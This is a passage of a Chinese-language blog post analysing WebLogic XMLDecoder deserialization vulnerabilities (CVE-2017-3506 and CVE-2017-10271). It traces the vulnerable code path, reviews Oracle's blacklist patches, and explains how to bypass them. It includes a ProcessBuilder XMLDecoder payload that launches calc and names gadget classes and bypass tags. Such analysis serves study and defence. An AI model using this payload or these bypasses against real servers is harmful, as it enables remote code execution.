+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var2</span><span class="p">.</span><span class="na">nextTag</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var2</span><span class="p">.</span><span class="na">nextTag</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">XMLStreamReaderToXMLStreamWriter</span><span class="w"> </span><span class="n">var3</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLStreamReaderToXMLStreamWriter</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">var4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">XMLStreamWriter</span><span class="w"> </span><span class="n">var5</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XMLStreamWriterFactory</span><span class="p">.</span><span class="na">create</span><span class="p">(</span><span class="n">var4</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var3</span><span class="p">.</span><span class="na">bridge</span><span class="p">(</span><span class="n">var2</span><span class="p">,</span><span class="w"> </span><span class="n">var5</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">var5</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">WorkContextXmlInputAdapter</span><span class="w"> </span><span class="n">var6</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WorkContextXmlInputAdapter</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">var4</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">this</span><span class="p">.</span><span class="na">receive</span><span class="p">(</span><span class="n">var6</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">XMLStreamException</span><span class="w"> </span><span class="n">var7</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WebServiceException</span><span class="p">(</span><span class="n">var7</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var8</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WebServiceException</span><span class="p">(</span><span class="n">var8</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>先是创建了个用来读 xml 的 var2，然后创建了输入流和输出流，将 xml 数据写到 var4 中，最后就是 var6 的构造了，跟进 <code>WorkContextXmlInputAdapter</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">WorkContextXmlInputAdapter</span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">xmlDecoder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLDecoder</span><span class="p">(</span><span class="n">var1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>new 了个 XMLDecoder，并将 var4 写进去了，然后跟进 <code>receive</code> 方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">receive</span><span class="p">(</span><span class="n">WorkContextInput</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">WorkContextMapInterceptor</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WorkContextHelper</span><span class="p">.</span><span class="na">getWorkContextHelper</span><span class="p">().</span><span class="na">getInterceptor</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">var2</span><span class="p">.</span><span class="na">receiveRequest</span><span class="p">(</span><span class="n">var1</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>继续跟进 <code>receiveRequest</code> ，一直跟进就会来到 <code>weblogic.wsee.workarea.WorkContextXmlInputAdapter</code> 的 <code>readUTF</code> 方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">readUTF</span><span class="p">()</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="p">)</span><span class="k">this</span><span class="p">.</span><span class="na">xmlDecoder</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>最终调用到 <code>readObject</code> ，对xml进行反序列化</p>
+<h3 id="漏洞修复-1" class="heading-element"><span>漏洞修复</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%ae%e5%a4%8d-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="cve-2017-3506-补丁分析" class="heading-element"><span>CVE-2017-3506 补丁分析</span>
+  <a href="#cve-2017-3506-%e8%a1%a5%e4%b8%81%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>在 <code>weblogic.wsee.workarea.WorkContextXmlInputAdapter</code> 中添加了 <code>validate</code> 验证，限制了 <code>object</code> 标签</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">validate</span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">is</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">WebLogicSAXParserFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WebLogicSAXParserFactory</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">SAXParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newSAXParser</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="n">parser</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="n">is</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DefaultHandler</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">startElement</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">uri</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">localName</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">qName</span><span class="p">,</span><span class="w"> </span><span class="n">Attributes</span><span class="w"> </span><span class="n">attributes</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SAXException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="k">if</span><span class="p">(</span><span class="n">qName</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;object&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                  </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;Invalid context type: object&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="p">});</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">ParserConfigurationException</span><span class="w"> </span><span class="n">var5</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;Parser Exception&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var5</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">SAXException</span><span class="w"> </span><span class="n">var6</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;Parser Exception&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var6</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">var7</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;Parser Exception&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">var7</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>将 <code>object</code> 修改成 <code>void</code> 即可绕过，比如像 payload 中用 <code>ProcessBuilder.start()</code> 这种没有返回值的方法来 rce时就能用 <code>void</code> 来绕过，用 <code>new</code> 也是可以的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;java version=&#34;1.4.0&#34; class=&#34;java.beans.XMLDecoder&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;new class=&#34;java.lang.ProcessBuilder&#34;&gt;    
+</span></span><span class="line"><span class="cl">        &lt;string&gt;calc&lt;/string&gt;
+</span></span><span class="line"><span class="cl">&lt;method name=&#34;start&#34; /&gt;
+</span></span><span class="line"><span class="cl">    &lt;/new&gt;
+</span></span><span class="line"><span class="cl">&lt;/java&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="cve-2017-10271-补丁分析" class="heading-element"><span>CVE-2017-10271 补丁分析</span>
+  <a href="#cve-2017-10271-%e8%a1%a5%e4%b8%81%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">validate</span><span class="p">(</span><span class="n">InputStream</span><span class="w"> </span><span class="n">is</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">WebLogicSAXParserFactory</span><span class="w"> </span><span class="n">factory</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">WebLogicSAXParserFactory</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">SAXParser</span><span class="w"> </span><span class="n">parser</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">factory</span><span class="p">.</span><span class="na">newSAXParser</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">      </span><span class="n">parser</span><span class="p">.</span><span class="na">parse</span><span class="p">(</span><span class="n">is</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">DefaultHandler</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">overallarraylength</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">         </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">startElement</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">uri</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">localName</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">qName</span><span class="p">,</span><span class="w"> </span><span class="n">Attributes</span><span class="w"> </span><span class="n">attributes</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">SAXException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="p">(</span><span class="n">qName</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;object&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;Invalid element qName:object&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">qName</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;new&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;Invalid element qName:new&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="p">(</span><span class="n">qName</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;method&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;Invalid element qName:method&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="k">if</span><span class="p">(</span><span class="n">qName</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;void&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                  </span><span class="k">for</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">attClass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">attClass</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">attributes</span><span class="p">.</span><span class="na">getLength</span><span class="p">();</span><span class="w"> </span><span class="o">++</span><span class="n">attClass</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                     </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="s">&#34;index&#34;</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="n">attributes</span><span class="p">.</span><span class="na">getQName</span><span class="p">(</span><span class="n">attClass</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;Invalid attribute for element void:&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">attributes</span><span class="p">.</span><span class="na">getQName</span><span class="p">(</span><span class="n">attClass</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                     </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                  </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">               </span><span class="k">if</span><span class="p">(</span><span class="n">qName</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;array&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                  </span><span class="n">String</span><span class="w"> </span><span class="n">var9</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">attributes</span><span class="p">.</span><span class="na">getValue</span><span class="p">(</span><span class="s">&#34;class&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                  </span><span class="k">if</span><span class="p">(</span><span class="n">var9</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">var9</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;byte&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                     </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IllegalStateException</span><span class="p">(</span><span class="s">&#34;The value of class attribute is not valid for array element.&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                  </span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>还是黑名单，又加了几个标签，参看xmldecoder的官方文档很容易发现 class 标签可以动态加载任意类</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041b48d91c.png" alt="image-20250428223424983" srcset="https://bu.dusays.com/2025/05/11/682041b48d91c.png?size=small, https://bu.dusays.com/2025/05/11/682041b48d91c.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041b48d91c.png?size=large 2x" data-title="image-20250428223424983" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>根据上面补丁的要求，我们知道所利用的类需要满足构造方法存在利用点，且其构造方法的参数类型恰好是字节数组或者是java中的基础数据类型，比如string，int这些，刚好 <code>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</code> 就满足</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041b4850e4.png" alt="image-20250428223724642" srcset="https://bu.dusays.com/2025/05/11/682041b4850e4.png?size=small, https://bu.dusays.com/2025/05/11/682041b4850e4.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041b4850e4.png?size=large 2x" data-title="image-20250428223724642" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>直接将传入的数据反序列化了，weblogic存在一个自带jre环境的版本，且自带的jdk版本为1.6+，可以利用jdk7u21 gadget达到RCE，也可以打 cc，之前在 T3 的时候就知道能打部分 cc，而且weblogic还有 spring 的组件，可以利用FileSystemXmlApplicationContext和ClassPathXmlApplicationContext类加载spring的配置文件，打spring的依赖注入</p>
+<p>后续的ban了class标签，还可以通过 <code>&lt;array method=&quot;forName&quot;&gt;</code> 来绕过，貌似只有 jdk1.6 能打，因为其XMLDecoder与高版本的不同</p>
+<p>最后就索性也限制了array元素的长度</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041dce03f7.png" alt="image-20250428224444013" srcset="https://bu.dusays.com/2025/05/11/682041dce03f7.png?size=small, https://bu.dusays.com/2025/05/11/682041dce03f7.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041dce03f7.png?size=large 2x" data-title="image-20250428224444013" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>据此，有佬给出了XMLDecoder官方文档的一句话</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041b47acad.png" alt="image-20250428225431687" srcset="https://bu.dusays.com/2025/05/11/682041b47acad.png?size=small, https://bu.dusays.com/2025/05/11/682041b47acad.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041b47acad.png?size=large 2x" data-title="image-20250428225431687" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>但貌似不行，如果超出了指定的 length ，应该还是会报错，暂时不深究了</p>
